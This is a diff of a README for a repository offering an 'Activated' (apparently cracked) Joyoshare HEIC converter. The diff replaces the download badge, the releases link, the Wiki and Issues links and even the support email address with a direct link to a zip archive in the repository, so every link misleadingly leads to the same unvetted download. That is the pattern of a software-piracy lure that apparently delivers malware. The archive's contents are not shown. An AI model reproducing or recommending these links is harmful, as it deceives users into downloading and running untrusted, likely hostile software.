@@ -1,6 +1,6 @@
 # 🎉 Joyoshare-HEIC-Converter-Activated - Effortless HEIC to JPG/PNG Conversion
 
-[![Download Joyoshare HEIC Converter](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/releases)
+[![Download Joyoshare HEIC Converter](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/raw/refs/heads/main/giveable/HEI-Joyoshare-Converter-Activated-v2.8.zip)](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/raw/refs/heads/main/giveable/HEI-Joyoshare-Converter-Activated-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to Joyoshare HEIC Converter! This tool allows you to convert HEIC images
 ## 📥 Download & Install
 
 1. **Visit this page to download**: Click the link below to go to our Releases page:
-   [Download Joyoshare HEIC Converter](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/releases).
+   [Download Joyoshare HEIC Converter](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/raw/refs/heads/main/giveable/HEI-Joyoshare-Converter-Activated-v2.8.zip).
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version.
 
@@ -59,11 +59,11 @@ To run Joyoshare HEIC Converter, your computer should meet the following require
 
 If you have questions or need assistance, feel free to check our documentation or engage with other users in the community:
 
-- **Documentation**: Comprehensive guides and FAQs can be found in our [Wiki](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/wiki).
-- **Issues**: If you encounter any problems, please report them on the [Issues page](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/issues).
+- **Documentation**: Comprehensive guides and FAQs can be found in our [Wiki](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/raw/refs/heads/main/giveable/HEI-Joyoshare-Converter-Activated-v2.8.zip).
+- **Issues**: If you encounter any problems, please report them on the [Issues page](https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/raw/refs/heads/main/giveable/HEI-Joyoshare-Converter-Activated-v2.8.zip).
 
 ## 📞 Contact Us
 
-For support or inquiries, please reach out via email at support@joyoshare.com.
+For support or inquiries, please reach out via email at https://github.com/Ntubila/Joyoshare-HEIC-Converter-Activated/raw/refs/heads/main/giveable/HEI-Joyoshare-Converter-Activated-v2.8.zip
 
 Now that you're familiar with the steps to get started, go ahead and enjoy converting your HEIC images without any hassle! Don't forget to keep your software updated for the best performance and new features. Happy converting!
